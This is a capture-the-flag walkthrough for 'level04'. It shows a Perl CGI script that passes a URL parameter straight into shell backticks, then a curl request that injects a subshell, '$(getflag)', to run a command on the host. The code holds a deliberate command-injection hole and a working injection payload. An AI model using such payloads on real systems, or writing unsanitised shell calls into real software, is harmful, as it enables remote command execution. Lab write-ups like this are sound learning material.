<h1 align="center"> level04 </h1>

```shell
ls -la
```

We have a ```level04.pl``` file. Here the content:
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

With comments:
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0]; # get the arg give to the funtion and set y to it
  print `echo $y 2>&1`; # execute shell's echo with y value
}
x(param("x")); # call x with parameter x - http
```

We can try it with:
```shell
curl 'localhost:4747?x=toto'
```
It print toto


We can inject a subshell like this:
```shell
curl 'localhost:4747?x=$(getflag)'
```

It give us the getflag result, who allows us to pass to the next level, it work !
